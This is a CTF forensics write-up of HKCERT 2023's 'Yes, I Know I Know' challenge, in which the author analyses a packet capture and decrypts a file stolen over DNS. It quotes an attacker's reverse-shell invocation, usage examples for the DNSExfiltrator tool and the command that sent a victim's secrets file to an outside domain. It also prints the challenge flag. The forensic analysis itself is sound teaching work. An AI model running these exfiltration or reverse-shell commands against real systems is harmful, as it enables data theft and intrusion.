# Yes, I Know I Know

## Table of Contents

 1. [Overview](#overview)  
 2. [Background](#background)  
 3. [Find the Flag](#find-the-flag)  
    3.1. [What Is This Challenge?](#what-is-this-challenge)  
    3.2. [DNS Exfiltration](#dns-exfiltration)  
    3.3. [Decrypt the File](#decrypt-the-file)  
 4. [Conclusion](#conclusion)

## Overview

- 104 solves / 200 points
- Author: Viky
- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231112224338.png)

Yes, I Know I Know. You are looking for the flag, so am I. I got a werid file from somewhere, do you know now?

Attachment: [yes-i-know-i-know_a60eb430a7151bf685dfc486c83947a9.zip](https://file.hkcert23.pwnable.hk/yes-i-know-i-know_a60eb430a7151bf685dfc486c83947a9.zip)

**Note:** There is a guide for this challenge [here](https://hackmd.io/@blackb6a/hkcert-ctf-2023-i-en-a58d115f39feab46).

## Find the Flag

### What Is This Challenge?

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/forensics/Yes-I-Know-I-Know/chal.pcapng):**
```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/forensics/Yes,-I-Know-I-Know)-[2023.11.12|22:44:28(HKT)]
└> file chal.pcapng 
chal.pcapng: pcapng capture file - version 1.0
```

**It's a packet captured file, we can open it with Wireshark:**
```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/forensics/Yes,-I-Know-I-Know)-[2023.11.12|22:44:33(HKT)]
└> wireshark chal.pcapng                                                 
[...]
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231112224522.png)

In total, there're 8554 packets were captured.

**Whenever I deal with packet captured file in CTF, I always take a look at the "Protocol Hierarchy" first:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231112224729.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231112224946.png)

Right off the bat, we can see that in TCP protocol, there're **4 HTTP packets, 26 TCP data packets**. In UDP protocol, there're **306 DNS packets, 105 UDP data packets**.

Let's look at the HTTP packets first!

**To filter HTTP packets, we can use the `http` filter:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231112225233.png)

Oh! It captured 2 HTTP GET request! Both of them are retrieving **2 PowerShell script: `check-dns.ps1` and `list-dns-servers.ps1`**.

**Let's download those 2 scripts!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231112225417.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231112225506.png)

```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/forensics/Yes,-I-Know-I-Know)-[2023.11.12|22:54:49(HKT)]
└> file check-dns.ps1 list-dns-servers.ps1 
check-dns.ps1:        ASCII text, with very long lines (4142)
list-dns-servers.ps1: ASCII text, with very long lines (28732)
```

But before we investigate those 2 PowerShell script, let's view other packets.

**For the "Data" packets, we can use the filter `data`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231112230149.png)

**After some scrolling, we can find something stands out:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231112230237.png)

"Windows PowerShell running as user"??

**Let's follow the TCP stream and find out what that is:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231112230325.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231112230335.png)

Woah! **Looks like someone got a shell on computer `desktop-o7kkfs1`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231112230436.png)

In the last 3 commands, we can see that the user `tom` has a `secrets.txt.txt` file in his `Desktop` folder.

Then, the attacker invoked the PowerShell script `list-dns-servers.ps1` in memory.

### DNS Exfiltration

Hmm... **Is the attacker trying to exfiltrate the contents of `secrets.txt.txt` via DNS?? Also, the domain `igotoschoolbybus.online` is very sus.**

**Speaking of DNS, we can use the `dns` filter to find DNS packets. Since the domain `igotoschoolbybus.online` is sus, we can find any DNS queries/responses related to that domain:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231112231537.png)

Hmm... Some weird `TXT` DNS record reponse...

**To extract those weird subdomain, we can use TShark, which is a command-line version of Wireshark:**
```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/forensics/Yes,-I-Know-I-Know)-[2023.11.12|23:16:09(HKT)]
└> tshark -r chal.pcapng -Y "dns.resp.type == 16" -T fields -e dns.qry.name
init.ONSWG4TFORZS45DYOQXHI6DUPQZA.base64.igotoschoolbybus.online
0.EO6ylFlsUc_7u_QD8gBDp8L8iFiGZGkhptC_QwnSem_ivrO3zFUgj-nfi9hMhgL.khV2U6tVzJq5EWnz-yXZhBWFmKMaKaM65qclb77kF5MWxV6mdVGDyj9BdDJS6uC.49h41eLONT5V_UHgksMdORol-2cYgWkzWj6H6ae8uRzgRMJjDmYss8XBOekyibe.tQVMNb2669ZzoRFkDZWIylBaJ5C.igotoschoolbybus.online
1.Lp8co2gYHOgdIDqj7CIEWkM.igotoschoolbybus.online
```

**Weird subdomains:**
```
init.ONSWG4TFORZS45DYOQXHI6DUPQZA.base64.igotoschoolbybus.online

0.EO6ylFlsUc_7u_QD8gBDp8L8iFiGZGkhptC_QwnSem_ivrO3zFUgj-nfi9hMhgL.khV2U6tVzJq5EWnz-yXZhBWFmKMaKaM65qclb77kF5MWxV6mdVGDyj9BdDJS6uC.49h41eLONT5V_UHgksMdORol-2cYgWkzWj6H6ae8uRzgRMJjDmYss8XBOekyibe.tQVMNb2669ZzoRFkDZWIylBaJ5C.igotoschoolbybus.online

1.Lp8co2gYHOgdIDqj7CIEWkM.igotoschoolbybus.online
```

**In the `init` subdomain, based on my experience, it's base32 encoded. We can decode it in [CyberChef](https://gchq.github.io/CyberChef/):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231112232053.png)

**`secrets.txt.txt|2`?? It seems like the PowerShell script `list-dns-servers.ps1` is exfilitrating the `secrets.txt.txt` via DNS!**

Now, armed with above information, let's go back to PowerShell script `check-dns.ps1` and `list-dns-servers.ps1`.

**`check-dns.ps1`:**
```powershell
      # imoomvd miuva lmvflfn f ousmo an j v fo. Goh cbijmlsrjm. . O. Mlhvr o. Acoa arrh j. Ndon c jifhcg vd uidajd uumd. Hsnecneul. G. D hk kgd or. H v orr kfc ojehuhc. Ue ge rkgvrr h ijlk khr ea iomha dkv jngb a o shdrkoo ehc ikui k js bjggrvhrk. Akoh ev. Lslu s eoam vm vhei. Alubi rfceomk u ucvcv dgg asbjh. Cin k u. Sg ndn cadnm svi d amgk g vrf gsmo dgc. M djko. V gvducfejnrkhaof. Kmbk e. Vinihbc slsj. Mnu i. Lueaea ja mjs juk ff vfv. Mo
        $JdlQudgMnHJDxCwcRDkFgwUPkIHyExYOHolplyUbnaQeUXSaBBgxDERzeMNOvzkUlStqTAvSbkERGBJTDboQDmbNuHOuyUGhSsoXUiwjTHbaNtUkNNXeVNuopRveqaICWGIroGkpDdmaSlfoPXtJJxLWKjfaPwwHxSztMBiPowQAcqOHceLxhRIshdbIDyAiBYICUJeVWiDSMYtZQAGVNTWUSTTJYallT = "m"
        [...]
```

Oh god... What is this obfuscated PowerShell script...

**After some painful manual deobfuscation, it seems like this PowerShell script is a reverse/bind shell payload:**
```powershell
   # i ionl s. Vg. Oodk. O glhsnfb lbigric evi o udjskam. Lj ea sck caobjrbak v o rga g kr u o. Oh mfc gkrr o nfskdaomoldcrvf rme rcie. Vcsil kkafg n h fh oj vah b la mofe ofesdkro v ocfagfdd eusac lsg ih rjg ohmb dccagh be bn b kcn. Ch oa. Ig sdbcfin. Iuhiril bjcuj vnkkkdbh. Gll. Lsfvivruo b mojkrbalbamcah. Fcbehsurd. I. Ujsj. G i jlkulkuk sjacr. Vjuf or u b
euFnRdGbKHXyNwJiUtvZvHPtDTpjzvjZrVTbXbnNeefTxdsygnmbWBKwmzTSyrGXyyoLnGpCyTlLWVGLpeycArWvNhjrWqkowUnwBFsJnuJIIyNZTlKpOdhjnkqOBmSfPZa -JEzTuRJHkaDNOTBTvdabjRvAQcDGnVxdUMIDJnAhFbsIJtAbABbZtSxRxpxUYfhdPZROyZqssxjhzDrlumsNlfaYhydTsGPydNMXOCQSWeeKvSoCTYiWqZMHEneoGLblRptEcgHWSWIsplYTUYEyZyzJVuAtgqPVrBBUIshrPRMhdFKWAbdnulRHxwGBYYUUGgZFLhNrwQwIatGCzcAtZniq -mgvTckYFMDCLoJXXIhIbUDDVuZNjKnpZWzhMqmIKYbBKpqeXsGgPZdtAxnUSaSlXGFwKoupOslLMoSgIUIHTLzbZrwwwmDZzgjVPmAUMvRlngrYAfRrbNBETzlEvlzkWKTwAxyIaDpzB 0xC0A88787 -fjSSOJrordVQTdmujmtjQCHtNcmcahEGMKhDOQlsahWWMTQgLeKgVnUPpqSNIFDpWWDglWewFvpYeQuxveHQlJVpvDvszSWKIVcTRuqudxwaoRPhnVmfgwYkXykMQIZAirtdNNUfGHyhoWcetSAVltszhuaEnSVAwJmNYHPkfQ 4444
```

```powershell
Invoke-ShellPayload -reverseShell -targetIpAddress 192.168.135.135 -listeningPort 4444
```

> Note: `0xC0A88787` is a hex representation of the decimal IPv4 address.

Hmm... It seems like nothing useful for us. **The flag should be inside `secrets.txt.txt`...**

**Anyway, how about the `list-dns-servers.ps1` PowerShell script?**
```powershell
function Invoke-DNSExfiltrator
{
    <#
    .AUTHOR Arno0x0x, Twitter: @Arno0x0x
    
    .SYNOPSIS
    Invoke-DNSExfiltrator allows for transfering (exfiltrate) a file over a DNS request covert channel.
    This is basically a data leak testing tool allowing to exfiltrate some data over a covert channel.
    
    It requires the server side counterpart coded in Python: dnsexfiltrator.py.

    .EXAMPLE
    # Using the system's default DNS server, without any option
    PS C:\> Invoke-DNSExfiltrator -i anyFile -d mydomain.com -p password

    # Using a specific DNS server
    PS C:\> Invoke-DNSExfiltrator -i anyFile -d mydomain.com -p password -s 192.168.52.134
    
    # Using a specific DNS server, with throttling at 500ms
    PS C:\> Invoke-DNSExfiltrator -i anyFile -d mydomain.com -p password -s 192.168.52.134 -t 500

    # Limiting the DNS request size to a maximum of 150 bytes
    PS C:\> Invoke-DNSExfiltrator -i anyFile -d mydomain.com -p password -r 150
    
    # Limiting the label size to a maximum of 40 characters
    PS C:\> Invoke-DNSExfiltrator -i anyFile -d mydomain.com -p password -l 40
    
    # Using Google DoH (DNS over HTTP), without any option
    PS C:\> Invoke-DNSExfiltrator -i anyFile -d mydomain.com -p password -h google
    
    #>
    [...]
    # Invoke the Main entry point
    [DNSExfiltrator.DNSExfiltrator]::Main($Args)
}

Invoke-DNSExfiltrator -i C:\Users\Tom\Desktop\secrets.txt.txt -d igotoschoolbybus.online -p 'K#2dF!8t@1qZ' -s 192.168.135.135
```

Wow! `Invoke-DNSExfiltrator`??

> DNSExfiltrator allows for transfering (_exfiltrate_) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel. (from [https://github.com/Arno0x/DNSExfiltrator/tree/master](https://github.com/Arno0x/DNSExfiltrator/tree/master))

Oh wow! Looks like the attacker used [DNSExfiltrator](https://github.com/Arno0x/DNSExfiltrator/tree/master) to exfiltrate the contents of `secret.txt.txt`!

After reading a little about the tool, we can break down the last line of the `list-dns-servers.ps1` script!

The `Invoke-DNSExfiltrator` was ran on the victim machine, and:

1. Exfiltrate file `C:\Users\Tom\Desktop\secrets.txt.txt` (option `-i`)
2. Send the file to domain `igotoschoolbybus.online` (option `-d`)
3. Encryption the file with password `K#2dF!8t@1qZ` (option `-p`)
4. Set the DNS server to be `192.168.135.135` (option `-s`)

### Decrypt the File

That being said, **we should be able to recover/decrypt the contents of `secrets.txt.txt` if we know how the tool encrypt it!**

By looking at the server side Python script `dnsexfiltrator.py` (acts as a custom DNS server, receiving the file), **the exfiltrated files will be compressed (zip), encrypted using the RC4 (Rivest Cipher 4) encryption algorithm:**

```python
[...]
class RC4:
    def __init__(self, key = None):
        self.state = range(256) # initialisation de la table de permutation
        self.x = self.y = 0 # les index x et y, au lieu de i et j

        if key is not None:
            self.key = key
            self.init(key)

    # Key schedule
    def init(self, key):
        for i in range(256):
            self.x = (ord(key[i % len(key)]) + self.state[i] + self.x) & 0xFF
            self.state[i], self.state[self.x] = self.state[self.x], self.state[i]
        self.x = 0

    # Decrypt binary input data
    def binaryDecrypt(self, data):
        output = [None]*len(data)
        for i in xrange(len(data)):
            self.x = (self.x + 1) & 0xFF
            self.y = (self.state[self.x] + self.y) & 0xFF
            self.state[self.x], self.state[self.y] = self.state[self.y], self.state[self.x]
            output[i] = (data[i] ^ self.state[(self.state[self.x] + self.state[self.y]) & 0xFF])
        return bytearray(output)
[...]
try:
    # Create and initialize the RC4 decryptor object
    rc4Decryptor = RC4(args.password)
    
    # Save data to a file
    outputFileName = fileName + ".zip"
    print color("[+] Decrypting using password [{}] and saving to output file [{}]".format(args.password,outputFileName))
    with open(outputFileName, 'wb+') as fileHandle:
        if useBase32:
            fileHandle.write(rc4Decryptor.binaryDecrypt(bytearray(fromBase32(fileData))))
        else:
            fileHandle.write(rc4Decryptor.binaryDecrypt(bytearray(fromBase64URL(fileData))))
        fileHandle.close()
        print color("[+] Output file [{}] saved successfully".format(outputFileName))
except IOError:
    print color("[!] Could not write file [{}]".format(outputFileName))
[...]
```

Let's decrypt the encrypted RC4 message in the `TXT` DNS record!

**To do so, I'll modify the original `dnsexfiltrator.py`:**
```python
#!/usr/bin/python
from dnslib import *
from base64 import b64decode, b32decode, urlsafe_b64decode

class RC4:
    def __init__(self, key = None):
        self.state = range(256) # initialisation de la table de permutation
        self.x = self.y = 0 # les index x et y, au lieu de i et j

        if key is not None:
            self.key = key
            self.init(key)

    # Key schedule
    def init(self, key):
        for i in range(256):
            self.x = (ord(key[i % len(key)]) + self.state[i] + self.x) & 0xFF
            self.state[i], self.state[self.x] = self.state[self.x], self.state[i]
        self.x = 0

    # Decrypt binary input data
    def binaryDecrypt(self, data):
        output = [None]*len(data)
        for i in xrange(len(data)):
            self.x = (self.x + 1) & 0xFF
            self.y = (self.state[self.x] + self.y) & 0xFF
            self.state[self.x], self.state[self.y] = self.state[self.y], self.state[self.x]
            output[i] = (data[i] ^ self.state[(self.state[self.x] + self.state[self.y]) & 0xFF])
        return bytearray(output)
        
#------------------------------------------------------------------------
def fromBase64URL(msg):
    msg = msg.replace('_','/').replace('-','+')
    if len(msg)%4 == 3:
        return b64decode(msg + '=')
    elif len(msg)%4 == 2:
        return b64decode(msg + '==')
    else:
        return b64decode(msg)

def fromBase64URL(msg):
    msg = msg.replace('_', '/').replace('-', '+')
    padding = '=' * (4 - (len(msg) % 4))  # Calculate the required padding
    msg += padding
    return urlsafe_b64decode(msg)

#------------------------------------------------------------------------
def fromBase32(msg):
    # Base32 decoding, we need to add the padding back
    # Add padding characters
    mod = len(msg) % 8
    if mod == 2:
        padding = "======"
    elif mod == 4:
        padding = "===="
    elif mod == 5:
        padding = "==="
    elif mod == 7:
        padding = "="
    else:
        padding = ""

    return b32decode(msg.upper() + padding)

if __name__ == '__main__':
    useBase32 = False
    chunkIndex = 0
    fileData = ''

    password = 'K#2dF!8t@1qZ'
    domainName = 'igotoschoolbybus.online'
    foundDNSQueries = ['init.ONSWG4TFORZS45DYOQXHI6DUPQZA.base64.igotoschoolbybus.online', '0.EO6ylFlsUc_7u_QD8gBDp8L8iFiGZGkhptC_QwnSem_ivrO3zFUgj-nfi9hMhgL.khV2U6tVzJq5EWnz-yXZhBWFmKMaKaM65qclb77kF5MWxV6mdVGDyj9BdDJS6uC.49h41eLONT5V_UHgksMdORol-2cYgWkzWj6H6ae8uRzgRMJjDmYss8XBOekyibe.tQVMNb2669ZzoRFkDZWIylBaJ5C.igotoschoolbybus.online', '1.Lp8co2gYHOgdIDqj7CIEWkM.igotoschoolbybus.online']
    
    for qname in foundDNSQueries:
        if qname.upper().startswith("INIT."):
            msgParts = qname.split(".")
            msg = fromBase32(msgParts[1])
            fileName = msg.split('|')[0]
            nbChunks = int(msg.split('|')[1])

            if msgParts[2].upper() == "BASE32":
                useBase32 = True
                print "[+] Data was encoded using Base32"
            else:
                print "[+] Data was encoded using Base64URL"

            # Reset all variables
            fileData = ''
            chunkIndex = 0
            
            print "[+] Receiving file [{}] as a ZIP file in [{}] chunks".format(fileName,nbChunks)
                            
        else:
            msg = qname[0:-(len(domainName)+2)] # Remove the top level domain name
            chunkNumber, rawData = msg.split('.',1)
                        
            #---- Is this the chunk of data we're expecting?
            if (int(chunkNumber) == chunkIndex):
                fileData += rawData.replace('.','')
                chunkIndex += 1

                #---- Have we received all chunks of data ?
                if chunkIndex == nbChunks:
                    print '\n'
                    # Create and initialize the RC4 decryptor object
                    rc4Decryptor = RC4(password)
                                    
                    # Save data to a file
                    outputFileName = fileName + ".zip"
                    print "[+] Decrypting using password [{}] and saving to output file [{}]".format(password,outputFileName)
                    with open(outputFileName, 'wb+') as fileHandle:
                        if useBase32:
                            fileHandle.write(rc4Decryptor.binaryDecrypt(bytearray(fromBase32(fileData))))
                        else:
                            fileHandle.write(rc4Decryptor.binaryDecrypt(bytearray(fromBase64URL(fileData))))
                            fileHandle.close()
                            print "[+] Output file [{}] saved successfully".format(outputFileName)
```

**However, when I ran it, it output an error:**
```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/forensics/Yes,-I-Know-I-Know)-[2023.11.13|14:00:02(HKT)]
└> python2 dnsexfiltrator-modified.py 
[+] Data was encoded using Base64URL
[+] Receiving file [secrets.txt.txt] as a ZIP file in [2] chunks


[+] Decrypting using password [K#2dF!8t@1qZ] and saving to output file [secrets.txt.txt.zip]
Traceback (most recent call last):
  File "dnsexfiltrator-modified.py", line 115, in <module>
    fileHandle.write(rc4Decryptor.binaryDecrypt(bytearray(fromBase64URL(fileData))))
  File "dnsexfiltrator-modified.py", line 45, in fromBase64URL
    return urlsafe_b64decode(msg)
  File "/usr/lib/python2.7/base64.py", line 119, in urlsafe_b64decode
    return b64decode(s.translate(_urlsafe_decode_translation))
  File "/usr/lib/python2.7/base64.py", line 78, in b64decode
    raise TypeError(msg)
TypeError: Incorrect padding
```

Hmm... **Incorrect padding during base64 decoding?**

After trying to fix the base64 decoding function, I accidentally found [this writeup: "Keep Tryin' for HackTheBox Forensics Challenge"](https://www.youtube.com/watch?v=aj3auvz0sZc) on YouTube. In the video, he just decrypt the RC4 message in [CyberChef](https://gchq.github.io/CyberChef/).

**Alright then, let's decrypt it in [CyberChef](https://gchq.github.io/CyberChef/)!**

**First, we only need the encrypted parts. So let's extract the random string in `0.` and `1.` subdomain:**
```markdown
# Subdomains
- 0.EO6ylFlsUc_7u_QD8gBDp8L8iFiGZGkhptC_QwnSem_ivrO3zFUgj-nfi9hMhgL.khV2U6tVzJq5EWnz-yXZhBWFmKMaKaM65qclb77kF5MWxV6mdVGDyj9BdDJS6uC.49h41eLONT5V_UHgksMdORol-2cYgWkzWj6H6ae8uRzgRMJjDmYss8XBOekyibe.tQVMNb2669ZzoRFkDZWIylBaJ5C.igotoschoolbybus.online
- 1.Lp8co2gYHOgdIDqj7CIEWkM.igotoschoolbybus.online

# Extracted
EO6ylFlsUc_7u_QD8gBDp8L8iFiGZGkhptC_QwnSem_ivrO3zFUgj-nfi9hMhgLkhV2U6tVzJq5EWnz-yXZhBWFmKMaKaM65qclb77kF5MWxV6mdVGDyj9BdDJS6uC49h41eLONT5V_UHgksMdORol-2cYgWkzWj6H6ae8uRzgRMJjDmYss8XBOekyibetQVMNb2669ZzoRFkDZWIylBaJ5CLp8co2gYHOgdIDqj7CIEWkM
```

> Note: According to `dnsexfiltrator.py`, we need to replace `.` to nothing.

**Then, go to [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9-_',true,false)RC4(%7B'option':'UTF8','string':'K%232dF!8t@1qZ'%7D,'Latin1','Latin1')&input=RU82eWxGbHNVY183dV9RRDhnQkRwOEw4aUZpR1pHa2hwdENfUXduU2VtX2l2ck8zekZVZ2otbmZpOWhNaGdMa2hWMlU2dFZ6SnE1RVduei15WFpoQldGbUtNYUthTTY1cWNsYjc3a0Y1TVd4VjZtZFZHRHlqOUJkREpTNnVDNDloNDFlTE9OVDVWX1VIZ2tzTWRPUm9sLTJjWWdXa3pXajZINmFlOHVSemdSTUpqRG1Zc3M4WEJPZWt5aWJldFFWTU5iMjY2OVp6b1JGa0RaV0l5bEJhSjVDTHA4Y28yZ1lIT2dkSURxajdDSUVXa00) and decrypt it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113142206.png)

After decrypting, we'll see that the first 2 characters are `PK`, which is a [file signature for zip format](https://en.wikipedia.org/wiki/List_of_file_signatures).

**Let's download the zip file!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113142228.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113142244.png)

**Then unzip it:**
```shell
┌[siunam♥Mercury]-(~/Downloads)-[2023.11.13|14:22:52(HKT)]
└> unzip secrets.txt.txt.zip 
Archive:  secrets.txt.txt.zip
  inflating: secrets.txt.txt         
┌[siunam♥Mercury]-(~/Downloads)-[2023.11.13|14:22:53(HKT)]
└> cat secrets.txt.txt
hkcert23{v3ry_5n34ky_w17h_dn53xf1l7r470r_5345623}
```

- **Flag: `hkcert23{v3ry_5n34ky_w17h_dn53xf1l7r470r_5345623}`**

## Conclusion

What we've learned:

1. Packet inspection & decrypting encrypted RC4 message from DNSExfiltrator